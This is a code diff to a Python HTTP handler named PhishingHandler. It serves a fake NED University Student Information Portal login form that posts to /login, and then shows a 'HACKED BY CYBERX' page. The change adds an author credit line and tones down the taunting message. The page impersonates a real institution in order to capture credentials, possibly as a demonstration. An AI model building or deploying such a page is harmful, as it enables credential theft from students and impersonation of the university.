@@ -152,6 +152,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
         <div class="login-box">
             <h1>NED University</h1>
             <h2>Student Information Portal</h2>
+            <h2>Created By : Muhammad Araiz, Muhammad Shuja, Muhammad Ahmed ( MSA )
             <form method="POST" action="/login">
                 <div class="input-group">
                     <label for="username">Username:</label>
@@ -465,7 +466,7 @@ body {
         <div class="success-box">
             <h1>HACKED BY CYBERX</h1>
             <div class="warning-icon">⚠️</div>
-            <h2>Haha, idiot — you are hacked!</h2>
+            <h2>You are hacked!!!</h2>
             <p>Account compromised by an unauthorized person.</p>
             <p>Immediately contact the IT Support Team.</p>
             <div class="cyber-team">— CyberX Security Team</div>
